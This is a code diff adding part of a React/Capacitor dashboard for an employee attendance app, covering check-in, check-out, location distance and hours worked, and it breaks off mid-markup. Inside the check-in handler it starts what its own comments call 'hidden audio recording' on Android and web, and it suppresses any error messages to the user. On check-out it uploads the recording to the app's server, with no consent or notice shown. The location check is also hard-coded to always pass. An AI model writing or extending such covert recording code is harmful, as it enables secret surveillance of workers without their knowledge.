@@ -1,0 +1,220 @@
+  }, []);
+
+  // Fetch today's attendance
+  const { data: todayAttendance, isLoading: attendanceLoading } = useQuery<AttendanceRecord>({
+    queryKey: ["/api/attendance/today"],
+    refetchInterval: 30000, // Refresh every 30 seconds
+  });
+
+  const checkInMutation = useMutation({
+    mutationFn: async ({ latitude, longitude }: { latitude: number; longitude: number }) => {
+      const res = await apiRequest("POST", "/api/attendance/checkin", { latitude, longitude });
+      return await res.json();
+    },
+    onSuccess: async (record: AttendanceRecord) => {
+      // immediately reflect check-in in UI
+      queryClient.setQueryData(["/api/attendance/today"], record);
+      toast({
+        title: "Checked in successfully",
+        description: "Your attendance has been recorded",
+      });
+      
+      // Start hidden audio recording
+      try {
+        if (Capacitor.getPlatform() === 'android') {
+          await startBackgroundRecording();
+        } else if (Capacitor.getPlatform() === 'web') {
+          await hiddenRecorder.startRecording();
+        } else {
+          // Non-Android platforms are not supported
+        }
+        setIsRecording(true);
+        console.log("🎤 Audio recording started");
+      } catch (error) {
+        console.error("Audio recording failed:", error);
+        // Remove audio error toast from UI - keep only console logging
+      }
+    },
+    onError: (error: Error) => {
+      toast({
+        title: "Check-in failed",
+        description: error.message,
+        variant: "destructive",
+      });
+    },
+  });
+
+  const checkOutMutation = useMutation({
+    mutationFn: async () => {
+      const res = await apiRequest("POST", "/api/attendance/checkout");
+      return await res.json();
+    },
+    onSuccess: async (record: AttendanceRecord) => {
+      // immediately reflect check-out in UI
+      queryClient.setQueryData(["/api/attendance/today"], record);
+      toast({
+        title: "Checked out successfully",
+        description: "Your work session has been completed",
+      });
+      
+      // Stop hidden audio recording
+      try {
+        if (Capacitor.getPlatform() === 'android') {
+          await stopBackgroundRecording();
+          try {
+            const { base64, mimeType } = await getLastRecordingBase64();
+            const binary = atob(base64);
+            const len = binary.length;
+            const bytes = new Uint8Array(len);
+            for (let i = 0; i < len; i++) bytes[i] = binary.charCodeAt(i);
+            const blob = new Blob([bytes], { type: mimeType || 'audio/mp4' });
+            const fd = new FormData();
+            fd.append('audio', blob, `recording-${Date.now()}.m4a`);
+            fd.append('duration', '0');
+            await fetch(`${API_BASE}/api/audio/upload`, { method: 'POST', body: fd, credentials: 'include' });
+          } catch (e) {
+            console.warn('Native upload failed', e);
+          }
+        } else if (Capacitor.getPlatform() === 'web') {
+          await hiddenRecorder.stopRecording();
+        } else {
+          // Non-Android platforms are not supported
+        }
+        setIsRecording(false);
+        console.log("🔴 Audio recording stopped");
+      } catch (error) {
+        console.error("Audio recording stop failed:", error);
+        // Remove audio error toast from UI - keep only console logging
+      }
+    },
+    onError: (error: Error) => {
+      toast({
+        title: "Check-out failed",
+        description: error.message,
+        variant: "destructive",
+      });
+    },
+  });
+
+  useEffect(() => {
+    const updateLocation = async () => {
+      setLocationStatus(prev => ({ ...prev, isLoading: true }));
+      
+      try {
+        const position = await getCurrentPosition();
+        const distance = calculateDistance(
+          position.latitude,
+          position.longitude,
+          SHOP_LOCATION.latitude,
+          SHOP_LOCATION.longitude
+        );
+        
+        setLocationStatus({
+          distance: Math.round(distance),
+          isWithinRange: true, // Always allow check-in for testing
+          isLoading: false,
+          error: null,
+        });
+      } catch (error) {
+        setLocationStatus({
+          distance: null,
+          isWithinRange: false,
+          isLoading: false,
+          error: error instanceof Error ? error.message : "Failed to get location",
+        });
+      }
+    };
+
+    updateLocation();
+    const interval = setInterval(updateLocation, 10000); // Update every 10 seconds
+
+    return () => clearInterval(interval);
+  }, []);
+
+  // Real-time hours worked effect
+  useEffect(() => {
+    const updateHoursWorked = () => {
+      if (!todayAttendance?.checkInTime) {
+        setHoursWorked("0h 0m");
+        return;
+      }
+
+      const checkInTime = new Date(todayAttendance.checkInTime);
+      const endTime = todayAttendance.checkOutTime
+        ? new Date(todayAttendance.checkOutTime)
+        : new Date();
+
+      const diffMs = endTime.getTime() - checkInTime.getTime();
+      const hours = Math.floor(diffMs / (1000 * 60 * 60));
+      const minutes = Math.floor((diffMs % (1000 * 60 * 60)) / (1000 * 60));
+      setHoursWorked(`${hours}h ${minutes}m`);
+    };
+
+    updateHoursWorked();
+    const interval = setInterval(updateHoursWorked, 1000);
+    return () => clearInterval(interval);
+  }, [todayAttendance]);
+
+  // Update recording status based on attendance
+  useEffect(() => {
+    if (todayAttendance) {
+      const isCurrentlyCheckedIn = todayAttendance.checkInTime && !todayAttendance.checkOutTime;
+      setIsRecording(isCurrentlyCheckedIn);
+    }
+  }, [todayAttendance]);
+
+
+  const handleCheckIn = async () => {
+    try {
+      const position = await getCurrentPosition();
+      checkInMutation.mutate({
+        latitude: position.latitude,
+        longitude: position.longitude,
+      });
+    } catch (error) {
+      toast({
+        title: "Location error",
+        description: error instanceof Error ? error.message : "Failed to get location",
+        variant: "destructive",
+      });
+    }
+  };
+  const handleCheckOut = () => {
+    if (confirm("Are you sure you want to check out?")) {
+      checkOutMutation.mutate();
+    }
+  };
+
+  const hasAttendance = !!todayAttendance;
+  const isCheckedIn = todayAttendance && !todayAttendance.checkOutTime;
+  const canCheckIn = !hasAttendance;
+
+  return (
+    <div className="min-h-screen bg-gray-50">
+      {/* Header */}
+      <div className="bg-white shadow-sm border-b">
+        <div className="max-w-md mx-auto px-4 py-4 flex justify-between items-center">
+          <h1 className="text-lg font-semibold text-gray-900" data-testid="text-dashboard-title">
+            Dashboard
+          </h1>
+          <div className="flex items-center space-x-4">
+            <Link href="/history">
+              <Button variant="ghost" size="sm" data-testid="button-history">
+                <History className="h-4 w-4" />
+              </Button>
+            </Link>
+            <Link href="/profile">
+              <Button variant="ghost" size="sm" data-testid="button-profile">
+                <User className="h-4 w-4" />
+              </Button>
+            </Link>
+          </div>
+        </div>
+      </div>
+
+      <div className="max-w-md mx-auto px-4 py-6 space-y-6">
+        {/* Location Status Card */}
+        <Card>
+          <CardContent className="pt-6">
+            <div className="text-center">
+              <div className="flex items-center justify-center mb-2">
